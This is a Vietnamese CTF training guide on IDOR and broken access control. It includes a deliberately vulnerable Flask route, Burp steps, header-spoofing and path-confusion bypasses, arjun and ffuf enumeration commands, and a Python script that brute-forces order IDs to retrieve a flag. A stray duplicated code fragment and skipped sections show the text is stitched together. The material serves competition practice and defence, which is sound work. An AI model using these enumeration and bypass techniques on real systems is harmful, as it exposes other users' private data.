IDOR & Broken Access Control

Khi trang web kiểm tra "bạn đã đăng nhập chưa" nhưng QUÊN kiểm tra "dữ liệu/chức năng này có đúng là của bạn không" — bạn chỉ cần đổi một con số hoặc một ID trong URL là xem được dữ liệu của người khác, hoặc gọi được chức năng lẽ ra chỉ admin mới được dùng. Không cần payload gì đặc biệt — đây là lỗ hổng dễ khai thác nhất một khi đã phát hiện.

00 / TÓM TẮT 1 PHÚT

IDOR / Broken Access Control là gì, để làm gì?

Rất nhiều chức năng web dùng ID để xác định "bản ghi nào" hoặc "trang nào": xem đơn hàng /order/482, xem hồ sơ /profile?user_id=17, tải file /document/9. Server có thể kiểm tra đúng "bạn đã đăng nhập" (authentication) nhưng quên kiểm tra "đơn hàng/hồ sơ/ file số 482 đó có đúng thuộc về bạn không" (authorization — phân quyền). Đây gọi là IDOR (Insecure Direct Object Reference). Phiên bản rộng hơn — Broken Access Control — là khi bạn gọi thẳng một chức năng/trang (vd /admin) mà server quên chặn với user thường.

Nếu chỉ nhớ một điều Luôn thử: đăng nhập bằng 2 tài khoản thường (user A, user B), lấy ID của tài khoản B (hoặc dữ liệu của B), rồi dùng session của A để gọi đúng ID đó. Nếu A xem/sửa được dữ liệu của B ⟹ IDOR. Trong CTF, flag thường nằm trong dữ liệu của 1 "nạn nhân" (user khác, hoặc record có ID đặc biệt).
⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay
⚡ IDOR / BROKEN ACCESS CONTROL
🚩 Nhận ra trong 30 giây URL/API có ID lộ ra: /api/user/123, ?order_id=55, /invoice/8821.pdf. Đổi số thành ID khác (tăng/giảm 1, hoặc ID của user khác) → nếu xem/sửa được dữ liệu không phải của mình ⟹ IDOR.
✅ Tiền đề cần có Có ít nhất 1 tài khoản đăng nhập được (kể cả tài khoản tự đăng ký miễn phí). Biết hoặc đoán được ID của "nạn nhân" — có thể chỉ cần thử ID nhỏ/liên tiếp.
🔍 Dò nhanh bằng Burp Repeater: lấy request của chính mình (vd GET /api/user/17 — 17 là ID của mình), đổi thành 16, 18, 1... Send từng cái, so sánh Response.

WAF khó chặn IDOR bằng regex vì payload trông y hệt request hợp lệ — phòng thủ đúng là sửa logic code (không thể qua WAF), nên mục 10 bài này sẽ nói kỹ hơn vì sao khác các bài trước.
01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

Authentication (xác thực) — kiểm tra "bạn là ai" (đăng nhập đúng mật khẩu, có cookie session hợp lệ).
Authorization (phân quyền) — kiểm tra "bạn được phép làm việc NÀY với dữ liệu NÀY không", sau khi đã biết bạn là ai. IDOR là lỗi ở bước này, không phải ở bước xác thực — bạn vẫn đăng nhập hợp lệ, chỉ là server quên kiểm tra quyền sở hữu dữ liệu.
Direct Object Reference — khi hệ thống dùng trực tiếp 1 giá trị (ID số, tên file...) để chỉ tới 1 bản ghi cụ thể trong request, thay vì giấu đi qua một lớp kiểm tra quyền.

Code hay viết (thiếu đúng 1 dòng kiểm tra quyền sở hữu):

# Python/Flask — chỉ kiểm tra ĐÃ ĐĂNG NHẬP, quên kiểm tra ĐÚNG CHỦ SỞ HỮU
@app.route("/api/order/<int:order_id>")
@login_required
def get_order(order_id):
    order = db.get_order(order_id)   # thiếu: if order.user_id != current_user.id: abort(403)
    return jsonify(order)
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Lập trình viên nhầm "đăng nhập" với "có quyền"

@login_required chỉ đảm bảo request có một session hợp lệ nào đó — không đảm bảo session đó có quyền với order_id cụ thể trong URL. Lập trình viên thường test bằng chính tài khoản của mình (tự nhiên ID khớp), không nghĩ tới việc đổi ID sang của người khác — lỗi này rất phổ biến vì nó không gây lỗi gì khi dùng bình thường, chỉ lộ ra khi có người cố tình đổi ID.

Đây cũng là lý do IDOR không cần "payload" như SQLi/XSS — bản chất là thiếu 1 dòng code so sánh, không phải dữ liệu bị hiểu sai cú pháp. Khai thác chỉ đơn giản là đổi giá trị hợp lệ thành một giá trị hợp lệ khác mà bạn không có quyền.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

So sánh: có check vs thiếu check quyền sở hữu

Khác biệt duy nhất giữa 2 nhánh là đúng 1 dòng code so sánh (order.user_id == current_user.id). Đây là lý do IDOR khó rà soát bằng mắt khi đọc lướt code — phải chủ động tìm đúng chỗ "lấy dữ liệu theo ID" rồi kiểm tra ngay bên dưới có dòng so sánh chủ sở hữu hay không.

05 / KHAI THÁC BẰNG BURP SUITE

Bấm gì (từng bước)

Bước 1-2 — bắt request của chính mình, đổi ID
  1. Đăng nhập tài khoản của bạn, thực hiện thao tác bình thường (xem đơn hàng của chính mình).
  2. Burp bắt request, Send to Repeater.
  3. Đổi ID trong URL/body sang ID khác, Send, so sánh Response (status code, nội dung).
Khi nào cần Intruder — dò hàng loạt ID Đánh dấu §id§, nạp payload type Numbers (vd 1→100), Start attack, sắp xếp theo cột Status/Length — ID nào trả về 200 với nội dung khác định dạng lỗi chuẩn (thường các ID "không phải của bạn" sẽ bị 403/404 nếu đã vá, nhưng nếu dính IDOR thì toàn bộ ID hợp lệ đều trả 200 với dữ liệu khác nhau).
Kỹ thuật riêng: so sánh 2 session song song Đăng nhập 2 tài khoản (2 tab trình duyệt/2 cookie khác nhau). Lấy request của tài khoản A, thử với cookie của tài khoản B (đổi header Cookie trong Repeater) nhưng giữ nguyên ID thuộc về A → nếu B xem được dữ liệu của A ⟹ IDOR xác nhận chắc chắn, không phải trùng hợp.
06 / PAYLOAD & KỸ THUẬT ĐẦY ĐỦ

Các dạng Broken Access Control thường gặp

A. IDOR cổ điển — đổi ID

Kỹ thuậtVí dụ
Tăng/giảm số nguyên/user/17 → thử 16, 1, 0
ID dạng chuỗi dễ đoánuser_0001 → thử admin, user_0000
ID mã hóa yếu (base64 của số)MTc= giải ra 17 — thử encode lại số khác

B. Broken Access Control — bypass kiểm tra quyền trên route

Kỹ thuậtVí dụ
Gọi thẳng endpoint ẩn/admin, /admin/users, /api/admin/delete dù giao diện không hiện link
Đổi methodNếu DELETE /api/user/5 bị chặn, thử POST /api/user/5/delete hoặc ngược lại
Thêm header giả vờ nội bộX-Forwarded-For: 127.0.0.1, X-Original-URL, X-Rewrite-URL (một số reverse proxy tin các header này)
Path confusion/admin/, /Admin, //admin, /admin/., /admin%2e — một số middleware check path khác cách web server thật sự route

C. Function-level access control (vai trò user thường gọi API chỉ dành admin)

Khác B ở chỗ: route không "ẩn", bạn biết endpoint tồn tại (thấy trong code JS frontend hoặc API docs) nhưng chỉ admin được phép gọi theo thiết kế — thử gọi thẳng bằng session user thường, xem app có check role ở phía server hay chỉ ẩn nút ở giao diện.

D. Dò tham số ẩn (khi IDOR không rõ ràng từ URL)

Nhiều API nhận thêm tham số không hiện trên giao diện (vd ?debug=1, ?admin=true) — dùng arjun (mục 07) để tự động dò thay vì đoán mò.

07 / CÔNG CỤ THỰC CHIẾN: ARJUN, FFUF & BURP AUTORIZE

Không chắc có ID/tham số ẩn nào? Dùng công cụ dò

A. arjun — dò tham số HTTP ẩn tự động (đã cài sẵn)

arjun — công cụ tự động thử hàng nghìn tên tham số phổ biến lên 1 endpoint, báo lại tham số nào server thực sự nhận ra (phản hồi khác đi), giúp tìm tham số kiểu admin=true, debug=1 mà bạn không thể đoán hết bằng tay.
arjun -u "http://TARGET/api/user" -m GET
arjun -u "http://TARGET/api/order" -m POST --headers "Cookie: session=..."

B. ffuf — dò ID/endpoint ẩn hàng loạt (đã cài sẵn)

# Dò ID hợp lệ trong khoảng 1-1000, chỉ hiện status 200
ffuf -u "http://TARGET/api/user/FUZZ" -w <(seq 1 1000) \
     -H "Cookie: session=..." -mc 200

# Dò tên endpoint admin ẩn bằng wordlist có sẵn
ffuf -u "http://TARGET/FUZZ" \
     -w ~/hoc/CTF/Tools/web/SecLists/Discovery/Web-Content/raft-small-directories.txt \
     -H "Cookie: session=..."

C. Burp Autorize (extension) — tự động hóa so sánh 2 session

Autorize — extension Burp (cài qua BApp Store khi còn Internet, phải cài trước ngày thi): tự động lặp lại MỌI request bạn gửi bằng session của 1 tài khoản quyền thấp hơn, rồi tự so sánh response — phát hiện Access Control lỗi hàng loạt mà không cần tự tay thử từng request.
Chưa xác nhận có cài offlineĐây là extension cần cài từ BApp Store (cần Internet) — phải tải và cài trước ngày thi nếu muốn dùng, không thể tải giữa trận. Nếu chưa kịp cài, kỹ thuật thủ công ở mục 05 (so sánh 2 session) vẫn làm được, chỉ chậm hơn.

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")

def exploit_idor(host, max_id=100):
    s = requests.Session()
    s.post(f"http://{host}/login", data={"username": "myaccount", "password": "mypass123"}, timeout=5)
    for uid in range(1, max_id):
        r = s.get(f"http://{host}/api/order/{uid}", timeout=5)
        m = FLAG_RE.search(r.text)
        if m:
            return m.group()
    return None

print("FLAG:", exploit_idor("TARGET_IP"))

            r = s.get(f"http://{host}/api/order/{uid}", timeout=5)
            m = FLAG_RE.search(r.text)
            if m:
                return m.group()
    except requests.RequestException:
        pass
    return None

10 / PHÒNG THỦ — KHÁC VỚI CÁC BÀI TRƯỚC

Vì sao IDOR khó chặn bằng WAF

Khác biệt quan trọngMọi bài trước (SQLi, XSS, LFI...) có payload bất thường để WAF nhận diện (dấu nháy, ../, thẻ <script>). IDOR không có payload bất thường — request GET /api/order/1 và GET /api/order/482 có cấu trúc giống hệt nhau, chỉ khác 1 con số hợp lệ. WAF (dựa trên pattern payload) về cơ bản không thể phân biệt request hợp pháp với request tấn công IDOR.
Việc có thể làm qua WAF (hạn chế)Hiệu quả
Rate-limit số lượng request khác nhau tới cùng 1 route trong thời gian ngắnChặn được kiểu duyệt tuần tự ồ ạt (brute-force ID), không chặn được 1-2 lần dò thủ công
Chặn truy cập /admin theo IP cố địnhVI PHẠM quy chế A/D (cấm chặn theo IP) — không được dùng

Phòng thủ thật sự cho IDOR nằm ở sửa logic code (thêm dòng kiểm tra chủ sở hữu) — nhưng quy chế A/D không cho sửa source. Vì vậy IDOR trong A/D gần như không phòng thủ được bằng WAF, chỉ có thể hạn chế phần nào bằng rate-limit. Chấp nhận rằng nhóm lỗ hổng này thiên về tấn công hơn phòng thủ.

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅App dùng ID công khai/đoán được (số tuần tự, UUID lộ ra chỗ khác) VÀ không kiểm tra chủ sở hữu ở phía server.
❌App kiểm tra đúng quyền sở hữu mỗi request (if resource.owner_id != current_user.id: abort(403)).
❌ID là UUID ngẫu nhiên thật sự và không lộ ra bất kỳ đâu (không có danh sách public, không trong URL chia sẻ) — không gian đoán quá lớn để brute-force.
13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng ví dụ mục 09 bằng tay trên Burp, đăng ký 2 tài khoản, xác nhận IDOR bằng kỹ thuật so sánh 2 session (mục 05).

Gợi ý nếu kẹtThu thập UUID từ endpoint công khai trước, rồi mới dùng chúng ở endpoint IDOR riêng tư — IDOR không chỉ là "đoán ID", mà còn là "tìm ID ở nơi nó bị lộ".

Thuật ngữ

IDOR (Insecure Direct Object Reference)Lỗi khi hệ thống dùng ID trực tiếp để truy cập bản ghi mà không kiểm tra quyền sở hữu.
Broken Access ControlNhóm rộng hơn: mọi lỗi thiếu kiểm tra quyền, kể cả không liên quan trực tiếp tới 1 ID cụ thể.
Authentication vs AuthorizationXác thực ("bạn là ai") khác phân quyền ("bạn được làm gì") — IDOR là lỗi ở vế thứ hai.
Function-level access controlKiểm tra quyền theo CHỨC NĂNG (route/API) thay vì theo từng bản ghi dữ liệu.
